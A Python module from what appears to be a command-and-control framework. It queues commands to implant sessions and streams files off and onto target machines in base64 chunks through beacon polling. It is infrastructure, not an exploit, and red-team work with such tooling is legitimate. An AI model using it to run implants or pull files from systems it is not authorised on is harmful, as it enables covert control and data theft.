"""Queue work on an agent session and wait for the answer, in one place.

The command channel is asynchronous: the operator's side appends to a queue, the
agent collects it on its next check-in, and the reply arrives some time later on
a different message. Everything above that — the console's `sessions download`,
the module library's `upload` — needs the same poll-until-answered loop, and a
copy of it in each caller is how one of them ends up quietly returning success
for a transfer that never left the server.

The rules this module keeps:

* A timeout is not an error to hide. It means the agent has not answered *yet*,
  and the command stays queued; the caller decides how to say that.
* A reply that is not the shape we asked for is an error, not an empty result.
  Base64 that fails to decode must not become a zero-byte file.
* Transfers stream: a chunk is written before the next is requested, so a large
  target-side file costs the operator a file handle, not a second copy of RAM.
* Chunk size is asked for, not assumed. Each agent reads with a buffer of its
  own and says how big it is, so the loop that moves a 100 MB file is the same
  loop for a Python stub and a 64 KB C implant — only the number of trips changes.
"""
from __future__ import annotations

import asyncio
import base64
import json
import logging
import os
import time
from typing import Any, Callable, Dict, Optional

from pupyteer.server.sessions.capabilities import DEFAULT_MAX_LINE

logger = logging.getLogger("pupyteer.sessions.transfer")

# One chunk per round trip when the agent puts no ceiling on it. Big enough that a
# 100 MB file is a sane number of beacons, small enough that the base64 stays
# inside the listener's message ceiling on both ends.
DEFAULT_CHUNK_SIZE = 512 * 1024

# What a declared line has to hold besides file data: the command envelope, the
# ids, the escaped task JSON and the path. Generous on purpose — the cost of
# being wrong in this direction is one more round trip, and the cost of being
# wrong in the other is a chunk the agent cannot read. At the Windows implant's
# 64 KB this leaves 47.6 KB of file data per beacon, against a line that reaches
# about 63.7 KB once base64 and framing are counted.
LINE_FRAMING_ALLOWANCE = 2048

# The agent picks commands up when it next checks in, so the wait is bounded by
# the beacon interval, not by how fast the target disk is.
DEFAULT_TIMEOUT = 120.0

_POLL_SECONDS = 0.25

Progress = Optional[Callable[[int, int], None]]


async def wait_for_command(
    session_manager: Any,
    session_id: str,
    command_id: str,
    timeout: float = DEFAULT_TIMEOUT,
) -> Optional[str]:
    """Poll the session queue until this command is answered.

    Returns the agent's raw output, or None if the deadline passed. A deadline is
    not a failure to hide: the agent may simply be between beacons, and the
    command stays queued so it can still be collected later.
    """
    deadline = time.time() + timeout
    while time.time() < deadline:
        for entry in await session_manager.get_pending_commands(session_id):
            if entry.get("command_id") != command_id:
                continue
            if entry.get("status") == "completed":
                return entry.get("result") or ""
        await asyncio.sleep(_POLL_SECONDS)
    return None


async def run_command(
    session_manager: Any,
    session_id: str,
    command: str,
    timeout: float = DEFAULT_TIMEOUT,
) -> Dict[str, Any]:
    """Queue one command line and wait for the agent's answer.

    Returns ``{"command_id": ..., "output": ...}``, where ``output`` is None if
    nothing came back before the deadline. When the command could not be queued at
    all the result carries ``error`` instead: a session that is gone is not a
    session that is slow, and neither the caller nor the operator should spend the
    whole timeout finding out which one they have.
    """
    command_id = await session_manager.interact(session_id, command)
    if not command_id:
        return {
            "command_id": None, "output": None,
            "error": f"session {session_id} would not accept a command "
                     f"(gone, or not connected)",
        }
    return {
        "command_id": command_id,
        "output": await wait_for_command(
            session_manager, session_id, command_id, timeout),
    }


async def run_action(
    session_manager: Any,
    session_id: str,
    task: Dict[str, Any],
    timeout: float = DEFAULT_TIMEOUT,
) -> Dict[str, Any]:
    """Queue a structured action and return the agent's reply as a dict.

    Anything the agent did not answer, or answered in a shape that is not a JSON
    object, comes back as ``{"error": ...}`` so a caller cannot read an empty
    result as a successful one.
    """
    answered = await run_command(
        session_manager, session_id, json.dumps(task), timeout)
    if answered.get("error"):
        return {"error": answered["error"]}
    answer = answered["output"]
    if answer is None:
        return {"error": f"the agent did not answer within {timeout:.0f}s "
                         f"(command {answered['command_id']})"}
    try:
        payload = json.loads(answer)
    except (json.JSONDecodeError, TypeError):
        # Two things land here: an implant that answered in prose nobody asked
        # for, and the queue answering on an implant's behalf — a tasking outside
        # the session's declared capabilities is refused as a sentence, in the
        # server, before it is ever sent. Neither is the agent's reply, so the
        # message says whose answer it is not rather than putting words on it.
        return {"error": f"no structured reply for {task.get('action', 'the task')}: "
                         f"{answer[:400]}"}
    if not isinstance(payload, dict):
        return {"error": f"agent returned {type(payload).__name__}, expected an object"}
    return payload


async def chunk_budget(
    session_manager: Any, session_id: str, chunk_size: int = DEFAULT_CHUNK_SIZE
) -> int:
    """Largest number of file bytes that fit one chunk on this session.

    A chunk is asked for, and answered, as a single line. The implant reads with
    a fixed buffer and says how big it is at registration, so the ceiling on a
    chunk is the smaller of what this module would like and what the agent said
    it can hold — base64 costs four bytes per three, and the envelope costs the
    rest. Sending a bigger chunk than that is not a transfer that fails loudly:
    the line is dropped where the server cannot see it, and the next thing the
    operator reads is a short file with a check mark next to it.
    """
    session = await session_manager.get(session_id)
    declared = getattr(session, "max_line", 0) or DEFAULT_MAX_LINE
    usable_line = declared - LINE_FRAMING_ALLOWANCE
    return min(chunk_size, max(usable_line, 0) * 3 // 4)


def _line_too_small(session_id: str) -> Dict[str, Any]:
    """Refuse a transfer the agent's own announced buffer cannot carry.

    An implant that reads lines shorter than the request envelope cannot accept a
    file chunk at all, and starting the loop anyway would spend a whole timeout
    per chunk to move nothing.
    """
    return {
        "status": "error",
        "bytes": 0,
        "error": f"session {session_id} declared a read line too small to carry "
                 f"a file chunk; nothing was transferred",
    }


async def pull(
    session_manager: Any,
    session_id: str,
    remote: str,
    sink: Any,
    timeout: float = DEFAULT_TIMEOUT,
    chunk_size: int = DEFAULT_CHUNK_SIZE,
    progress: Progress = None,
) -> Dict[str, Any]:
    """Read ``remote`` off the target into the open binary ``sink``, in chunks."""
    chunk_size = await chunk_budget(session_manager, session_id, chunk_size)
    if chunk_size <= 0:
        return _line_too_small(session_id)
    offset = 0
    total = -1
    while True:
        payload = await run_action(
            session_manager, session_id,
            {"action": "fs_get", "path": remote, "offset": offset,
             "length": chunk_size},
            timeout=timeout,
        )
        if payload.get("error") or payload.get("ok") is False:
            return {
                "status": "error",
                "error": payload.get("error", "the agent refused the read"),
                "bytes": offset,
            }

        try:
            data = base64.b64decode(payload.get("data", ""), validate=True)
        except (base64.binascii.Error, TypeError, ValueError) as exc:
            return {
                "status": "error",
                "error": f"agent sent data that is not base64: {exc}",
                "bytes": offset,
            }
        if not data:
            break
        sink.write(data)
        total = payload.get("size", -1)
        offset += len(data)
        if progress:
            progress(offset, total if total >= 0 else offset)
        if payload.get("eof") or (isinstance(total, int) and total >= 0 and offset >= total):
            break

    return {"status": "ok", "bytes": offset, "size": total}


async def push(
    session_manager: Any,
    session_id: str,
    local: str,
    remote: str,
    timeout: float = DEFAULT_TIMEOUT,
    chunk_size: int = DEFAULT_CHUNK_SIZE,
    progress: Progress = None,
) -> Dict[str, Any]:
    """Send the local file ``local`` to ``remote`` on the target, in chunks."""
    if not os.path.isfile(local):
        return {"status": "error", "error": f"local file not found: {local}"}

    chunk_size = await chunk_budget(session_manager, session_id, chunk_size)
    if chunk_size <= 0:
        return _line_too_small(session_id)

    size = os.path.getsize(local)
    offset = 0
    with open(local, "rb") as source:
        while True:
            data = source.read(chunk_size)
            if not data and offset:
                break
            payload = await run_action(
                session_manager, session_id,
                {"action": "fs_put", "path": remote, "offset": offset,
                 "data": base64.b64encode(data).decode()},
                timeout=timeout,
            )
            if not payload.get("ok"):
                return {
                    "status": "error",
                    "error": payload.get("error", "the agent refused the write"),
                    "bytes": offset,
                }
            offset += len(data)
            if progress:
                progress(offset, size)
            if not data:
                # An empty file is still a file: one zero-length write creates it
                # on the target instead of reporting a transfer that did nothing.
                break

    return {"status": "ok", "bytes": offset, "size": size}
